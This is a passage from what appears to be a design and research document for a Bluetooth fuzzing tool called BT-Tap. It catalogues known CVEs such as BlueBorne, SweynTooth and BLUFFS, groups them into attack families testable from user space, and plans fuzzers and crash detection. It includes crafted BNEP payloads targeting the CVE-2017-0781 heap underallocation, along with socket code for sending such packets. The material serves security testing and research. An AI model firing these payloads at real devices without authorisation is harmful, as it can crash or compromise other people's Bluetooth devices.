| **BlueBorne** CVE-2017-0781 | 2017 | BNEP | Oversized BNEP control message causes heap alloc < data | **Yes** -- L2CAP PSM 15 | BNEP Setup UUID size field |
| **BlueBorne** CVE-2017-1000251 | 2017 | L2CAP | Malformed L2CAP config response overflows stack buffer | **Yes** -- L2CAP config | L2CAP Config Options TLV |
| **BlueBorne** CVE-2017-1000250 | 2017 | SDP | BlueZ SDP server continuation state offset unvalidated | **Yes** -- L2CAP PSM 1 | SDP ContinuationState |
| **KNOB** CVE-2019-9506 | 2019 | LMP | Forces minimum encryption key size (1 byte) | **No** -- baseband MitM | LMP encryption key length |
| **BIAS** CVE-2020-10135 | 2020 | LMP | Role-switch during authentication bypass | **Partial** -- MAC spoof probe | LMP role switch |
| **BrakTooth** (16 CVEs) | 2021 | LMP | Various LMP/baseband crashes | **No** -- ESP32/SDR | LMP PDUs |
| **SweynTooth** CVE-2019-19192 | 2020 | ATT | Sequential ATT requests cause deadlock | **Yes** -- BLE L2CAP CID 4 | ATT opcodes rapid-fire |
| **SweynTooth** Truncated L2CAP | 2020 | L2CAP | Length field > actual payload | **Yes** -- BLE L2CAP | L2CAP Length field |
| **SweynTooth** ATT Large MTU | 2020 | ATT | MTU=0xFFFF allocation crash | **Yes** -- BLE L2CAP CID 4 | ATT Exchange MTU |
| **SweynTooth** Zero-size L2CAP | 2020 | L2CAP | Zero-length SDU in credit-based flow | **Yes** -- BLE L2CAP | L2CAP SDU length |
| **SweynTooth** Invalid L2CAP Fragment | 2020 | L2CAP | Fragmented L2CAP with invalid continuation | **Yes** -- BLE L2CAP | L2CAP continuation |
| CVE-2018-5383 | 2018 | SMP | ECDH public key not validated on P-256 curve | **No** -- pairing MitM | SMP Public Key X,Y |
| CVE-2020-26555 | 2020 | LMP/HCI | PIN pairing bypass via MAC spoofing | **Partial** -- MAC spoof | LMP PIN response |
| **BLUFFS** CVE-2023-24023 | 2023 | LMP | Session key derivation manipulation | **No** -- baseband MitM | LMP session key diversifier |
| **BLURtooth** CVE-2020-15802 | 2020 | SMP(CTKD) | Cross-transport key derivation abuse | **Partial** -- BLE pairing | SMP CTKD |
| **PerfektBlue** CVE-2024-45431+ | 2024 | L2CAP/RFCOMM/AVRCP | Invalid L2CAP CID=0 + AVRCP fuzzing | **Yes** -- L2CAP | L2CAP CID field |
| CVE-2020-0022 (BlueFrag) | 2020 | L2CAP/ATT | Android RCE via crafted L2CAP | **Yes** -- L2CAP | L2CAP reassembly |
| CVE-2024-24746 (NimBLE) | 2024 | ATT | Prepare Write + disconnect = infinite loop | **Yes** -- BLE ATT | ATT Prepare Write offset |

### 11.2 User-Space Testable Patterns (5 Directly Testable Families)

**Family 1: SDP Continuation State Abuse**
- CVE-2017-0785 (Android), CVE-2017-1000250 (BlueZ)
- Attack: Cross-service continuation state reuse, incremental offset probing
- Socket: L2CAP PSM 1, MTU=50
- Already in BT-Tap: `SDPFuzzer.probe_continuation_state()` (partial)

**Family 2: BNEP Control Message Overflow**
- CVE-2017-0781 (Android)
- Attack: BNEP Setup Connection with UUID size causing heap underallocation
- Socket: L2CAP PSM 15
- NOT in BT-Tap

```python
BNEP_FUZZ = {
    "setup_overflow": (
        b"\x01"          # BNEP Control type
        b"\x01"          # Setup Connection Request
        b"\x10"          # UUID size = 16
        + b"\xFF" * 32   # Two 16-byte UUIDs
    ),
    "invalid_control": b"\x01\xFF",
    "zero_uuid": b"\x01\x01\x00",
    "oversized_ethernet": (
        b"\x00"              # General Ethernet
        + b"\xFF" * 6        # Dst MAC
        + b"\xFF" * 6        # Src MAC
        + b"\x08\x00"        # EtherType IPv4
        + b"\xFF" * 65535    # Oversized
    ),
}
```

**Family 3: BLE ATT Stack Attacks (SweynTooth-pattern)**
- CVE-2019-19192, CVE-2024-24746
- Attack: Sequential requests without response, MTU=0xFFFF, Prepare Write overflow
- Socket: BLE L2CAP CID `0x0004`
- NOT in BT-Tap

**Family 4: L2CAP Config/Frame Attacks**
- CVE-2017-1000251, PerfektBlue CVE-2024-45431
- Attack: Malformed config options, CID=0
- Socket: Raw L2CAP (requires Bumble/Scapy for signaling; CID=0 may work via raw)

**Family 5: AT Command Parser Overflow**
- No specific CVE, but AT parsers historically under-validated
- Attack: Oversized arguments, CRLF injection, format strings
- Socket: RFCOMM channel (user-space)
- Partially in BT-Tap: `RFCOMMFuzzer.at_fuzz()` (5 basic patterns)

### 11.3 LMP/Firmware-Only Patterns (Version Heuristics Approach)

These cannot be tested from user-space. The best approach is version/chipset-based heuristic detection:

| Vulnerability | Heuristic |
|--------------|-----------|
| KNOB (CVE-2019-9506) | BT version < 5.1 without vendor patches |
| BrakTooth (16 CVEs) | Chipset matching (ESP32, Qualcomm, Intel specific models) |
| CVE-2018-5383 (Invalid Curve) | BT version < 5.1 |
| BLUFFS (CVE-2023-24023) | BT version < 5.4 without vendor patches |
| SweynTooth Key Size Overflow | BLE stack version heuristic |

Current BT-Tap coverage: KNOB, BrakTooth, Invalid Curve have version heuristics in `vuln_scanner.py`. **BLUFFS is missing** -- should be added.

---

## 12. Implementation Strategy

### 12.1 What Can Be Fuzzed from User-Space

| Target | Socket Type | Python API | What You Control |
|--------|------------|------------|-----------------|
| AT commands over RFCOMM | `BTPROTO_RFCOMM` | `socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM)` | Application data (AT command text) |
| OBEX over RFCOMM | `BTPROTO_RFCOMM` | Same as above | OBEX packets (opcode+headers) |
| SDP payloads | `BTPROTO_L2CAP` PSM 1 | `socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)` | SDP PDU content |
| BNEP payloads | `BTPROTO_L2CAP` PSM 15 | Same | BNEP control/data frames |
| RFCOMM frames (raw) | `BTPROTO_L2CAP` PSM 3 | Same | Raw RFCOMM frame bytes |
| BLE ATT PDUs | `BTPROTO_L2CAP` CID 4 | Raw L2CAP to fixed CID (may need `BT_SECURITY` opt) | ATT opcode + fields |
| BLE SMP PDUs | `BTPROTO_L2CAP` CID 6 | Raw L2CAP to fixed CID | SMP code + fields |

### 12.2 What Requires Raw HCI / Bumble / Scapy

| Target | Why | Tool |
|--------|-----|------|
| L2CAP signaling commands | Kernel handles signaling | Bumble, Scapy |
| L2CAP config option manipulation | Kernel handles config negotiation | Bumble, Scapy |
| L2CAP MTU/CID header fuzzing | Kernel builds L2CAP headers | Bumble, Scapy, raw HCI |
| BLE advertising PDUs | Kernel builds advertising data | `hcitool`, raw HCI, Bumble |
| Link Layer PDUs | Below HCI boundary | SDR (USRP), ESP32 firmware |
| LMP messages | Firmware-level | ESP32 (InternalBlue), SDR |

**Recommended libraries:**
- **Bumble** (Google): Full user-space BLE stack in Python, best for L2CAP/ATT/SMP fuzzing
- **Scapy**: Bluetooth layer support, good for packet crafting
- **PyBluez**: Basic socket API, sufficient for RFCOMM/L2CAP data-level fuzzing
- **bleak**: BLE GATT client, too high-level for raw ATT fuzzing

### 12.3 Crash Detection Strategy

| Signal | Detection Method | Confidence |
|--------|-----------------|------------|
| Connection drop after fuzz packet | `socket.recv()` raises `ConnectionResetError` or returns empty | High -- likely crash/panic |
| No response (timeout) | `socket.settimeout(5)` + `TimeoutError` | Medium -- could be hang or ignored packet |
| Unexpected error response | Parse response for error codes not expected for valid operations | Low -- may be normal rejection |
| Device disappears from scan | `hcitool scan` / `bluetoothctl` after fuzz session | High -- firmware crash/reboot |
| Device reboot (different uptime) | Compare pre/post scan device properties | High -- confirms crash |
| Repeated connection failures | Cannot reconnect after N attempts | Medium -- resource exhaustion or crash |

**Crash detection approach for BT-Tap:**
1. Before fuzzing: establish baseline (connect, verify communication)
2. Send fuzz packet
3. Wait for response with timeout
4. If connection dropped or no response: log packet, attempt reconnect
5. If reconnect fails: mark as potential crash, rescan
6. If reconnect succeeds: continue fuzzing
7. After session: compare device state to baseline

### 12.4 Recommended Fuzzing Libraries

```python
# For RFCOMM-level fuzzing (AT commands, OBEX):
import socket
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM,
                     socket.BTPROTO_RFCOMM)
sock.connect((target_addr, channel))

# For L2CAP-level fuzzing (SDP, BNEP, raw RFCOMM):
import socket
sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET,
                     socket.BTPROTO_L2CAP)
sock.connect((target_addr, psm))

# For BLE ATT fuzzing via Bumble:
from bumble.device import Device
from bumble.transport import open_transport
from bumble.l2cap import L2CAP_Connection_Parameter_Update_Request

# For packet crafting/analysis:
from scapy.layers.bluetooth import *
```

---

## 13. Fuzzing Priority Matrix

Ranked by historical CVE yield, user-space testability, implementation effort, and expected remaining bug density.

| Rank | Attack Surface | CVE Yield | User-Space? | Effort | Bug Density | Already in BT-Tap? |
|------|---------------|-----------|-------------|--------|-------------|---------------------|
| **1** | SDP continuation state | High (2 CVEs) | Yes (L2CAP PSM 1) | Low (extend existing) | Medium | Partial |
| **2** | BLE ATT protocol fuzzing | High (SweynTooth + NimBLE) | Yes (CID 0x0004) | Medium | High | No |
| **3** | BNEP control messages | High (CVE-2017-0781) | Yes (L2CAP PSM 15) | Low | Medium | No |
| **4** | AT command parser | Medium (no named CVE, but common) | Yes (RFCOMM) | Low (extend existing) | Medium-High | Minimal (5 patterns) |
| **5** | OBEX packet/header fuzzing | Medium (academic papers) | Yes (RFCOMM) | Medium | High (undertested) | No |
| **6** | OBEX App-Parameters TLV | Medium | Yes (RFCOMM) | Medium | High (profile parsers) | No |
| **7** | BLE SMP pairing | High (CVE-2018-5383) | Partial (CID 0x0006) | High | Medium | No |
| **8** | RFCOMM frame fuzzing | Medium | Yes (L2CAP PSM 3) | Medium | Medium | No |
| **9** | L2CAP config options | High (CVE-2017-1000251) | Needs Bumble/Scapy | High | Medium | No |
| **10** | SDP data element mutations | Medium | Yes (L2CAP PSM 1) | Medium | Medium | No |
| **11** | BLE advertising PDUs | Medium (SweynTooth) | Needs raw HCI | High | Low | No |
| **12** | GATT characteristic writes | Low | Yes (CID 0x0004) | Low | Low | Partial (vuln_scanner) |
| **13** | L2CAP CID=0 / signaling | Medium (PerfektBlue) | Needs Bumble/Scapy | High | Medium | No |
| **14** | LMP/baseband (KNOB, BrakTooth, BLUFFS) | Very High | No (firmware only) | N/A | N/A | Version heuristic only |

**Recommended implementation order:**

1. **Extend AT fuzzer** -- Lowest effort, highest immediate coverage gain. Use payloads from section 6.7.
2. **Build OBEX fuzzer** -- New class, targets PBAP/MAP parsers on IVI systems. Use constants from section 5.7.
3. **Build BLE ATT fuzzer** -- Targets SweynTooth-class bugs. Use opcode table from section 7.1.
4. **Add BNEP fuzzer** -- Simple L2CAP PSM 15, targets CVE-2017-0781 pattern.
5. **Extend SDP fuzzer** -- Add data element mutations and all 3 request types.
6. **Add BLUFFS heuristic** to vuln_scanner (BT < 5.4 version check).
7. **Build SMP fuzzer** -- Complex state machine, but targets important crypto bugs.
8. **Add RFCOMM frame fuzzer** -- Via raw L2CAP PSM 3.

---

## Sources

- Bluetooth Core Specification v5.4 -- Parts A (BR/EDR Baseband), B (Link Manager), D (L2CAP), F (RFCOMM), G (ATT), H (SMP)
- IrDA OBEX 1.5 Specification
- HFP v1.8 Specification (Bluetooth SIG)
- 3GPP TS 07.10 (GSM MUX / RFCOMM framing basis)
- 3GPP TS 27.007 (AT command set for GSM/UMTS)
- 3GPP TS 27.005 (SMS AT interface)
- ITU-T V.250 (AT command syntax)
- Armis Labs, "BlueBorne Technical White Paper" (2017)
- Antonioli et al., "The KNOB is Broken" USENIX Security 2019
- Antonioli et al., "BIAS: Bluetooth Impersonation AttackS" IEEE S&P 2020
- Garbelini et al., "SweynTooth: Unleashing Mayhem over BLE" USENIX ATC 2020
- Garbelini et al., "BrakTooth: Causing Havoc on Bluetooth Link Manager" USENIX Security 2022
- Antonioli et al., "BLUFFS: Bluetooth Forward and Future Secrecy" ACM CCS 2023
- PCAutomotive, "PerfektBlue: OpenSynergy BlueSDK CVE Chain" (2024)
- BlueZ source: sdp.h, obexd/plugins/pbap.c, obexd/src/map_ap.h, obexd/plugins/mas.c
- Zephyr RTOS: sdp.h, att.h header definitions
- nOBEX (NCC Group): headers.py, requests.py, responses.py
- BlueCove: ResponseCodes.java
- Linux kernel: smp.h, bluetooth/l2cap.h
